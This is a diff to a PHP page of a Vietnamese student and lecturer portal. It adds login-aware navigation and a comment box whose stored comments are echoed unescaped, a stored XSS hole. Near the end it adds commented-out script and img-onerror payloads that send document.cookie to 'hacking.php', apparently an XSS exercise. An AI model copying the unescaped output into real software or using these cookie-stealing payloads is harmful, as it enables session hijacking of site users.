@@ -1,5 +1,8 @@
+<?php session_start(); ?>
+
 <?php require 'layout/_header.php'; ?>
 <?php require 'model/DBPDO.php'; ?>
+<?php require 'helper.php'; ?>
 <nav class="navbar navbar-default dh">
   <div class="container">
     <ul class="nav navbar-nav">
@@ -10,22 +13,34 @@
       <li><a href="#">Giới thiệu</a></li>
       <li><a href="#">Hỏi đáp</a></li>
       <li><a href="#">Trợ giúp</a></li>
-      <li><a href="gv.php">Giảng viên</a></li>
+      <?php if(!isset($_SESSION['magv'])): ?>
+        <li><a href="gv.php">Giảng viên</a></li>
+      <?php endif ?>
       <li>
-                            <div class="custom input-group">
-                                <input type="text" class=" form-control" placeholder="Tìm kiếm" />
-                                <!-- <span class="input-group-btn"> -->
-
-                            </div>
-
-                      </li>
-    </ul>
-
-    <ul class="nav navbar-nav navbar-right">
-      <li><a href="login.php"><span class="glyphicon glyphicon-log-in">
-      </span> Đăng nhập</a>
+        <div class="custom input-group">
+          <input type="text" class=" form-control" placeholder="Tìm kiếm" />
+            <!-- <span class="input-group-btn"> -->
+        </div>
       </li>
     </ul>
+    <?php if(!isset($_SESSION['masv'])): ?>
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="login.php"><span class="glyphicon glyphicon-log-in">
+        </span> Đăng nhập</a>
+        </li>
+      </ul>
+    <?php else: ?>
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="profile/production/logout.php"><span class="glyphicon glyphicon-log-in">
+        </span> Đăng xuất</a>
+        </li>
+      </ul>
+      <ul class="nav navbar-nav navbar-right">
+        <li><a href="profile/production"><span class="glyphicon glyphicon-log-in">
+        </span> Trang cá nhân</a>
+        </li>
+      </ul>
+     <?php endif ?>
   </div>
 </nav>
 <div class="container-fluid content">
@@ -122,6 +137,42 @@
           </form>
         </div>
       </div>
+
+      <div class="sub-box">
+        <div class="title">
+          <p>Đóng góp ý kiến</p>
+        </div>
+        <div class="body">
+          <?php if(isset($_SESSION['magv']) || isset($_SESSION['masv'])): ?>
+          <h5>Ý kiến của bạn</h5>
+          <form  action='addcomment.php' method="post">
+            <textarea name='cmt' rows='5' class='form-control'></textarea>
+            <input type="hidden" name="masv" value="<?php echo $_SESSION['masv']; ?>">
+            <br>
+            <button  name='submit' type='submit' style='padding:10px' class='btn btn-primary'>Gửi</button>
+            <!-- <input type="button" name="poll" value="Hủy"> -->
+          </form>
+        <?php endif ?>
+
+        <?php $rows=$exp->fetch_all(" SELECT * from comment order by id  DESC limit 5"); ?>
+        <?php foreach($rows as $key => $row ): ?>
+          <div class="media mb-4">
+            <div class="media-body">
+              <h5 class="mt-0">
+                <?php echo $row['masv']; ?>
+              </h5>
+              <p>
+                <?php echo $row['cmt']; ?>
+              </p>
+            </div>
+
+          </div>
+        <?php endforeach ?>
+
+
+      </div>
+
+      </div> <!-- end comment -->
 
     </div> <!-- end colmd4 -->
 
@@ -315,7 +366,7 @@
               $sql = "SELECT * FROM sinhvien";
               $r = $exp->fetch_all($sql);
              ?>
-            
+
             <div class="info">
               <i class=" glyphicon glyphicon-arrow-right"></i>
               <a href="#">
@@ -653,6 +704,19 @@
     </div>
     <!-- end col 8 -->
     </div>
+    <!-- <script type="text/javascript">
 
+      window.location.href="hacking.php?cookie=" + document.cookie;
+    </script> -->
+    <!-- <script type="text/javascript">
+      var image = new Image();
+      var d = new Date();
+      image.src='hacking.php?cookie='+document.cookie+"&time="+d;
+    </script> -->
+    <?php //var_dump($_COOKIE); ?>
+    <?php //var_dump($_SERVER['HTTP_USER_AGENT']); ?>
+    <!-- <img src="" onerror="this.src='hacking.php?cookie='+document.cookie"> -->
   </div>
 <?php require 'layout/_footer.php'; ?>
+
+
